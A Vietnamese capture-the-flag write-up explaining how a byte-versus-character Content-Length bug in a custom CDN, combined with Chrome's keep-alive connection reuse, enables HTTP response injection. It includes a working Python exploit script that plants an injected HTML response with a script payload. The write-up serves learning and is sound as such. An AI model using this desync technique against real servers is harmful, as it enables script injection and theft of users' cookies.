Một challenge rất hay do `qxxxb` viết trong giải `Circle City Con 8.0` vào năm 2020, thông qua challenge này đã giúp mình hiểu hơn về HTTP desync và browser, cùng vào bài nào

## Goal bài và trở ngại
- Bài gồm 1 frontend server và 1 CDN server chứa các notes do user tải lên. CDN chứa 1 endpoint để get flag nhưng cần có token đúng
- Ta cần tìm ra cách để lấy được token do bot nắm giữ, token này nằm trong cookie của bot khi nó visit các note của ta
- Các note tải lên được lưu vào file và không thông qua hàm encode/sanitize nào tuy nhiên khi trả về từ CDN thì `Content-Type` luôn là `plain/text` do đó không thể XSS trực tiếp

## HTTP Desync
Tại `notes.py` là source code của CDN server, server này được tác giả implement từ raw TCP, đọc đến hàm `send_file` nơi xử lý việc trả về các notes cho user ta sẽ thấy một bug có thể lead đến HTTP desync:
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/d6cf50ea-d598-4fb4-a454-9352d209de91)

Hàm `http_header` sẽ prepare phần header cho response:
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/7f1d20e1-9bd1-4b91-9ec5-9bc98da0b06b)

Để ý thấy trong header thì length của message được lấy sau khi convert lại từ bytes về string, nhưng khi đem message đi chia thành các chunk thì lại dùng message ở dạng `bytes`, nghĩa là nếu ban đầu message chứa các multibytes unicode thì chắc chắn length khi decode về string sẽ ít hơn so với khi gửi => **HTTP Desync**
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/ace4d6b9-9f82-4d5e-881a-8f87f322340d)

Vậy ta có thể inject thêm 1 response về response gốc của server CDN, vậy ta có thể làm gì với lỗi này?

## Chrome implementation
Chrome có hỗ trợ parallel connection, bằng chứng là khi truy cập vào web ta sẽ thấy nhiều tài nguyên được load cùng lúc, ví dụ như `favicon.ico`, `styles.css`, `main.js` sẽ được load cùng lúc chứ không tuyến tính. Tuy nhiên số tài nguyên được load cùng lúc lại bị giới hạn lại, với mỗi domain thì chrome sẽ chỉ cho phép **6** parallel connection.

Để tiết kiệm tài nguyên, chrome sẽ không luôn luôn khởi tạo 1 TCP connection mới để load resource, mà sẽ check xem có TCP connection nào có thể reuse được không bằng cách kiểm tra `Connection` header, nếu mang giá trị `keep-alive` thì chrome sẽ biết connection này có thể reuse được và tiếp tục fetch resource thông qua tcp connection này.

Như ta thấy thì trong response header của cdn sẽ luôn có `Connection: keep-alive`, vậy liệu ta có thể kết hợp bug HTTP desync ta có và Chrome implementation lại hay không? 

## Exploitation idea
Vì đặc điểm của CDN server là nó sẽ chia response thành các chunk dài 1448 bytes và sleep 0.1s sau mỗi lần gửi, nên ta có thể tạo 1 note chứa payload khiến response bị split ra, 5 note còn lại sẽ khiến cho cả 6 connection bị lock, ngay khi connection của evil note ta tạo ban đầu load xong n bytes đầu tiên, nó sẽ tiếp tục reuse connection để load tiếp các bytes chứa phần response mà ta đã inject vào

Anatomy:
```
-----------------------------------------------------------
admin bot -------------------------------> frontend
admin bot --------------node#0-----------> CDN ( finish in ns )
admin bot --------------node#1-----------> CDN ( finish in n+xs )
admin bot --------------node#2-----------> CDN ( finish in n+xs )
admin bot --------------node#3-----------> CDN ( finish in n+xs )
admin bot --------------node#4-----------> CDN ( finish in n+xs )
admin bot --------------node#5-----------> CDN ( finish in n+xs )
admin bot --------------node#6-----------> CDN (reuse connection of node#0, fetch malicious response)
-----------------------------------------------------------
```

Chrome bắt buộc các HTTP response phải nằm trong các TCP chunk khác nhau, do đó ta sẽ phải canh chỉnh để khiến HTTP response align đúng theo quy tắc này:
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/5dd87041-3d0c-41f1-a7d7-efbc51ece7fa)

Ở đây ký tự `¡` sẽ chiếm 2 byte, ta sẽ pad 1448 byte `¡` và 1448 byte bao gồm (payload + padding) với cách craft trên thì `Content-Type` mà chrome nhận được sẽ là `2896`, thấp hơn nhiều so với length của response thực tế, bằng cách này thì `2896` bytes mà chrome đọc sẽ chỉ đến cuối của phần padding 1448 byte `¡`, phần padding "AAAA..." phía sau là để nâng length của response lên đúng bằng cuối phần padding chữ `¡` ban đầu, và response tiếp theo mà chrome fetch từ connection lúc nãy sẽ là response mà ta inject vào

```py
import requests 

def create_note(content, id):
    burp0_url = "http://localhost:3100/board/add_note"
    burp0_json={"body": content, "id": id}
    return "http://localhost:3101/" + id + "/" + requests.post(burp0_url, json=burp0_json).text.replace("\"", "")

    
def create_evil_note(id, script = "<script>alert()</script>"):
    
    payload = f"""HTTP/1.1 200 OK\r
Content-Type: text/html\r
Content-Length: {len(script)}\r
\r
{script}"""

    payload_len = 1448 
    payload = payload + "A" * (payload_len - len(payload))

    ans = "¡"*1448 + payload 
    create_note(ans, id)

def fill_5_other_connection(id):
    for _ in range(5):
        create_note("😍"*(1448*10), id)


def exploit():
    res = requests.get("http://localhost:3100/create_board", allow_redirects=False)
    id = res.headers['location'][len("/board/"):]
    
    payload = "<script>alert(origin)</script>"

    create_evil_note(id, payload)
    fill_5_other_connection(id)
    create_note("a", id)

    print("payload at: " + id)

exploit()
```
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/c5a149a6-4c9a-45a2-8b4d-8b737cdb5122)

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/747bc2b0-67a2-4943-9350-1fb2d258ac53)



